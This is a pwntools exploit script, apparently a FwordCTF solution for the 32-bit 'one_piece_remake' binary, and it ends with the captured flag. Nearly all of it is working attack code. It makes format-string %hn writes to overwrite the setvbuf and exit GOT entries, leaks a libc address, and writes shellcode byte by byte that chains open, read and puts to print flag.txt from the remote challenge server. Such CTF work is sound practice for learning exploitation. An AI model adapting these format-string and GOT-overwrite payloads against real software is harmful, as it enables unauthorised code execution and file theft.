from pwn import *

local = 0

context.clear(arch='i386')

if local == 1:
    p = process("./one_piece_remake")
    stdout_offset = [0x1D5D80]
    system_offset = [0x3cd80]
    bin_offset = [0x17bb8f]
    open_offset = [0xe5140]
    read_offset = [0xe56c0]
    puts_offset = [0x673d0]
    
else :
    p = remote("onepiece.fword.wtf",1236)
    stdout_offset = [0x1e9d20 ]   #libc6_2.30-0ubuntu2.2_i386
    system_offset = [0x0458b0 ]
    bin_offset = [0x19042d]
    open_offset = [0x0f4d80 , 0x0f4db0 , 0x0f4d80]
    read_offset = [0x0f51a0 , 0x0f51d0 , 0x0f51a0]
    write_offset = [0x0f5240, 0x0f5270 ,0x0f5240 ]
    puts_offset = [0x071b70]
    
def makeshell(string,addr):
    of = list( string )
    j = 0
    for i in of :
        setsc(i,addr+j)    
        j += 1
    log.info(len(string))
    return len(string)
    
def setsc(of,addr):
    of = ord(of)
    p.sendlineafter(">>","gomugomunomi")
    payload = ""
    payload += "%"+str(of-2)+"c  "
    payload += "%11$hn"
    payload += " "*(16-len(payload))
    payload += p32(addr)
    p.sendlineafter(">>",payload)

sc = 0x0804A038
setvbuf_got = 0x0804a028
stdout_got = 0x08049ffc
exit_got = 0x804a020
puts_plt = 0x08048440
main = 0x0804881e
popret = 0x80483ed
ppr = 0x80488ba
pppr = 0x80488b9

p.sendlineafter(">>","gomugomunomi")
payload = ""
payload += "%"+str(0x804-2)+"c  "
payload += "%14$hn"
payload += "%"+str(0x8440-0x804-1)+"c "
payload += "%15$hn"
payload += p32(setvbuf_got+2)
payload += p32(setvbuf_got)
p.sendlineafter(">>",payload)

p.sendlineafter(">>","gomugomunomi")
payload = ""
payload += "%"+str(0x804-2)+"c  "
payload += "%14$hn"
payload += "%"+str(0x881e-0x804-1)+"c "
payload += "%15$hn"
payload += p32(exit_got+2)
payload += p32(exit_got)

p.sendlineafter(">>",payload)
p.sendlineafter(">>","exit")

# context.log_level = "debug"
p.recv(4)
stdout = u32(p.recv(4)) - 71

libc =stdout - stdout_offset[0]
idx = 1
fopen = libc + open_offset[idx]
fread = libc + read_offset[idx]
puts = libc + puts_offset[0]

log.info(hex(libc))

payload = asm("push 0")

p.sendlineafter(">>","read")
p.sendlineafter(">>",payload)

# open(sc+0x20,"r")
# read(3,sc+0x50,0x50)
# puts(sc+0x50)
# push - 3 - 2 - 1 - dummy - ptr
# 0x0804A038
slen = 2
makeshell("flag.txt",sc+0x40)

slen += makeshell(asm("push "+hex(sc+0x50)),sc+slen)
slen += makeshell(asm("push 0x50"),sc+slen)
slen += makeshell(asm("push "+hex(puts)),sc+slen)

slen += makeshell(asm("push 0x50"),sc+slen)
slen += makeshell(asm("push "+hex(sc+0x50)),sc+slen)
slen += makeshell(asm("push 3"),sc+slen)
slen += makeshell(asm("push "+hex(pppr)),sc+slen)
slen += makeshell(asm("push "+hex(fread)),sc+slen)

slen += makeshell(asm("push 0x0"),sc+slen)
slen += makeshell(asm("push "+hex(sc+0x40)),sc+slen)
slen += makeshell(asm("push "+hex(ppr)),sc+slen)
slen += makeshell(asm("push "+hex(fopen)),sc+slen)
slen += makeshell(asm("ret"),sc+slen)

p.sendlineafter(">>","run")
# p.sendlineafter(">>","run")

p.interactive()
#FwordCTF{i_4m_G0inG_t0_B3coM3_th3_p1r4Te_K1NG}